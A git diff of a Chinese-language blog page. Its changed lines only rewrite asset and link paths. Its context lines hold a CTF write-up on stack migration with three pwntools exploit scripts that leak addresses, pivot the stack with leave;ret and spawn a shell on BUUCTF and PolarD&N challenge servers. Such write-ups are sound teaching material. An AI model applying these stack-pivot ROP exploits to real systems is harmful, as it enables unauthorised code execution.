@@ -8,8 +8,8 @@
 <head>
   <meta charset="UTF-8">
 
-  <link rel="apple-touch-icon" sizes="76x76" href="/12yhy3/img/fluid.png">
-  <link rel="icon" href="/12yhy3/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/12yhy3/12yhy3.github.io/img/fluid.png">
+  <link rel="icon" href="/12yhy3/12yhy3.github.io/img/fluid.png">
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -24,7 +24,7 @@
     <meta name="description" content="一. 漏洞原理二. 漏洞利用任意地址写 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 addr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Stack_migration">
-<meta property="og:url" content="https://github.com/12yhy3/2024/11/25/stack_migrant/index.html">
+<meta property="og:url" content="https://github.com/12yhy3/12yhy3.github.io/2024/11/25/stack_migrant/index.html">
 <meta property="og:site_name" content="Darkness_Sword">
 <meta property="og:description" content="一. 漏洞原理二. 漏洞利用任意地址写 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。  第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 addr">
 <meta property="og:locale" content="zh_CN">
@@ -74,12 +74,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
 
 
-<link  rel="stylesheet" href="/12yhy3/css/main.css" />
+<link  rel="stylesheet" href="/12yhy3/12yhy3.github.io/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/12yhy3/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/12yhy3/12yhy3.github.io/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/12yhy3/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/12yhy3/12yhy3.github.io/css/highlight-dark.css" />
   
 
 
@@ -92,15 +92,15 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/12yhy3/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/12yhy3/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"github.com","root":"/12yhy3/12yhy3.github.io/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/12yhy3/12yhy3.github.io/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/12yhy3/js/utils.js" ></script>
-  <script  src="/12yhy3/js/color-schema.js" ></script>
+  <script  src="/12yhy3/12yhy3.github.io/js/utils.js" ></script>
+  <script  src="/12yhy3/12yhy3.github.io/js/color-schema.js" ></script>
   
 
   
@@ -128,7 +128,7 @@
 <div class="header-inner" style="height: 100vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/12yhy3/">
+    <a class="navbar-brand" href="/12yhy3/12yhy3.github.io/">
       <strong>Darkness_Sword</strong>
     </a>
 
@@ -147,7 +147,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/" target="_self">
                 <i class="iconfont icon-home-fill"></i>
                 <span>首页</span>
               </a>
@@ -159,7 +159,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/archives/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/archives/" target="_self">
                 <i class="iconfont icon-archive-fill"></i>
                 <span>归档</span>
               </a>
@@ -171,7 +171,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/categories/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/categories/" target="_self">
                 <i class="iconfont icon-category-fill"></i>
                 <span>分类</span>
               </a>
@@ -183,7 +183,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/tags/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
                 <span>标签</span>
               </a>
@@ -195,7 +195,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/about/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
                 <span>关于</span>
               </a>
@@ -207,7 +207,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/12yhy3/links/" target="_self">
+              <a class="nav-link" href="/12yhy3/12yhy3.github.io/links/" target="_self">
                 <i class="iconfont icon-link-fill"></i>
                 <span>友链</span>
               </a>
@@ -237,7 +237,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/12yhy3/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/12yhy3/12yhy3.github.io/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -407,7 +407,7 @@
 <p>题源：BUUCTF-PWN（<font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道]</font>）</p>
 </blockquote>
 <p><strong><font style="color:#DF2A3F;">方法1：栈迁移+ret2libc3</font></strong></p>
-<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><img src="D:\My_blog_website\public\img\1.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><img src="D:\My_blog_website\public\img\1.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <h5 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h5><p>payload’2’为参考exp构造，<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xzzzz911/article/details/133842017">详见</a>。官方wp同payload2。</p>
 <table>
 <thead>
@@ -497,7 +497,7 @@
 <p>与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。</p>
 </blockquote>
 <p>一. 栈迁移调用 puts函数 泄露puts真实地址</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/gif/34628707/1706536374323-a5cd75a5-fb32-4097-9da6-de7b0dad8171.gif" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <p>二. 返回到main函数后第二次栈迁移获取shell</p>
 <p>（1）函数内部结尾的 **<font style="color:#DF2A3F;">leave结束后</font>**栈结构：</p>
 <table>
@@ -643,15 +643,15 @@
 <p><font style="color:#DF2A3F;">主要思路：</font><font style="color:#117CEE;">由于</font><strong><font style="color:#117CEE;">printf以%s打印数据时候遇到 b’\x00’ 才会停止</font></strong><font style="color:#117CEE;">。输入满8字节，利用</font><strong>printf函数可以直接打印出函数 _IO_file_jumps 地址</strong><font style="color:#117CEE;">，</font><strong>利用给出的 libc程序进而获取 libc_base 地址</strong><font style="color:#117CEE;">， 然后直接得到system和&#x2F;bin&#x2F;sh地址，只进行一次栈迁移（payload2）即可获取shell。</font></p>
 </blockquote>
 <p>tips：有个疑点，如下图。<strong>kali与Xubuntu下gdb调试的栈帧结构出现了不一致</strong>……</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613471638-30dcb5b4-654c-495e-b8e2-9425aaf60ee7.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613471638-30dcb5b4-654c-495e-b8e2-9425aaf60ee7.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <blockquote>
 <p>kali下_IO_file_jumps函数在打印地址上方，但实际上应该在下面。所以才会带出_IO_file_jumps函数地址。</p>
 </blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613479807-766b01bb-ceea-447f-b838-add0788621ca.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706613479807-766b01bb-ceea-447f-b838-add0788621ca.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <blockquote>
 <p><strong><font style="color:#DF2A3F;">Xubuntu下gdb调试结构：（与靶机实际栈结构一致）</font></strong></p>
 </blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706614846465-7cb1bea0-bca5-4636-b1aa-4104471e45d2.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706614846465-7cb1bea0-bca5-4636-b1aa-4104471e45d2.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <p>exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27066</span>)<br><br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><span class="hljs-comment"># 第一次发送数据利用printf函数泄露一个函数地址</span><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <br>_IO_file_jumps =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_IO_file_jumps))<br><span class="hljs-comment"># 获得栈地址</span><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>,_IO_file_jumps)<br>libc_base = _IO_file_jumps-libc.dump(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -659,10 +659,10 @@
 <p>题源：PolarD&amp;N-PWN</p>
 </blockquote>
 <h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><p>首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system(‘ls’)；可以调用system函数。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625334763-bf872cff-e026-4fa9-b915-e24b5046a73b.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625334763-bf872cff-e026-4fa9-b915-e24b5046a73b.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。</p>
 <p>第二次构造ROP链，利用read向栈读入 &#x2F;bin&#x2F;sh\x00 参数 构造 system(‘&#x2F;bin&#x2F;sh’)后面函数。ebp填充栈地址，然后填充leave；ret 进行栈迁移，使得程序再次从栈地址运行，获取shell。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625502204-84a14677-bbf1-4fe2-9df4-07ec66686f95.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625502204-84a14677-bbf1-4fe2-9df4-07ec66686f95.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;120.46.59.242&#x27;</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#io = process(&#x27;./1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br>io.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><br>ebp_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>stack = ebp_addr-<span class="hljs-number">0x40</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>leave = <span class="hljs-number">0x8048488</span><br>sys = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p1 = (<span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sys) + p32(<span class="hljs-number">1</span>) + p32(stack+<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span> ).ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment">#注意\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;</span><br>p1 += p32(stack) + p32(leave)<br><br>io.send(p1)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <h3 id="栈地址未知-1"><a href="#栈地址未知-1" class="headerlink" title="栈地址未知"></a>栈地址未知</h3><blockquote>
@@ -674,12 +674,12 @@
 <p>题源：BUUCTF-PWN（ <font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道] </font>)</p>
 </blockquote>
 <h5 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h5><p>反汇编得到主要功能函数代码</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123197057-70bd5a85-6479-452d-b04b-f13ca979ef22.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123197057-70bd5a85-6479-452d-b04b-f13ca979ef22.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <p>查看汇编代码获取调用read函数的代码段地址，便于后续利用read写入数据，同时减少了调用read_plt需要传参的问题。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123202931-fb0a2d97-986b-400b-8ca8-21b5269722cd.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123202931-fb0a2d97-986b-400b-8ca8-21b5269722cd.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <p>查看可写代码段bss地址，选用大于0x404070并且小于0x405000的位置布置rop。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123206113-46d449c7-7853-4ba0-82d4-31a631690d24.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123628067-5bde1dff-294d-43c0-bfc4-f186a6749ad3.png" srcset="/12yhy3/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123206113-46d449c7-7853-4ba0-82d4-31a631690d24.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123628067-5bde1dff-294d-43c0-bfc4-f186a6749ad3.png" srcset="/12yhy3/12yhy3.github.io/img/loading.gif" lazyload></p>
 <h5 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h5><h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26923</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>offset = <span class="hljs-number">0x50</span><br><br>bss = <span class="hljs-number">0x405000</span>-<span class="hljs-number">0x900</span><br>read = <span class="hljs-number">0x4011ff</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rbp = <span class="hljs-number">0x40115d</span><br>leave = <span class="hljs-number">0x401227</span><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset  + p64(bss+<span class="hljs-number">0x50</span>) + p64(read)<br>r.sendafter(<span class="hljs-string">b&#x27;just chat with me:\n&#x27;</span>,payload)<br><span class="hljs-comment"># 第二次payload会调用read从rbp-0x50即 bss地址开始写入</span><br><br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>p2 += p64(pop_rbp) + p64(bss+<span class="hljs-number">0x800</span>) + p64(read)<br>p2 = p2.ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss) + p64(leave)<br>r.sendafter(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>,p2)<br> <span class="hljs-comment"># p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：</span><br><br><span class="hljs-comment"># rbp     aaaaaaaa</span><br><span class="hljs-comment"># rip    p64(pop_rdi) + p64(puts_got) + p64(puts_plt)     -----leak_addr</span><br><span class="hljs-comment"># rip-&gt;rip    p64(pop_rbp) + p64(bss+0x800) + p64(read)</span><br><span class="hljs-comment">#       栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)</span><br>r.recvuntil(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>)<br>puts =u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)<br>payload =payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(bss +<span class="hljs-number">0x800</span> -<span class="hljs-number">0x58</span>) +p64(leave)<br><span class="hljs-comment"># 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
 <h4 id="pwn271"><a href="#pwn271" class="headerlink" title="pwn271"></a>pwn271</h4><p>参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。</p>
@@ -695,7 +695,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/12yhy3/tags/span-class-label-label-primary-stack-migration-span/" class="print-no-link">#<span class="label label-primary">stack_migration</span></a>
+        <a href="/12yhy3/12yhy3.github.io/tags/span-class-label-label-primary-stack-migration-span/" class="print-no-link">#<span class="label label-primary">stack_migration</span></a>
       
     </div>
   
@@ -708,7 +708,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>Stack_migration</div>
-      <div>https://github.com/12yhy3/2024/11/25/stack_migrant/</div>
+      <div>https://github.com/12yhy3/12yhy3.github.io/2024/11/25/stack_migrant/</div>
     </div>
     <div class="license-meta">
       
@@ -756,7 +756,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/12yhy3/2024/11/25/hello-world/" title="Hello World">
+                      <a href="/12yhy3/12yhy3.github.io/2024/11/25/hello-world/" title="Hello World">
                         <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -885,8 +885,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/12yhy3/js/events.js" ></script>
-<script  src="/12yhy3/js/plugins.js" ></script>
+<script  src="/12yhy3/12yhy3.github.io/js/events.js" ></script>
+<script  src="/12yhy3/12yhy3.github.io/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -908,7 +908,7 @@
 
 
   
-    <script  src="/12yhy3/js/img-lazyload.js" ></script>
+    <script  src="/12yhy3/12yhy3.github.io/js/img-lazyload.js" ></script>
   
 
 
@@ -1007,7 +1007,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/12yhy3/js/local-search.js" ></script>
+  <script  src="/12yhy3/12yhy3.github.io/js/local-search.js" ></script>
 
   <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
@@ -1022,7 +1022,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/12yhy3/js/boot.js" ></script>
+<script  src="/12yhy3/12yhy3.github.io/js/boot.js" ></script>
 
 
   
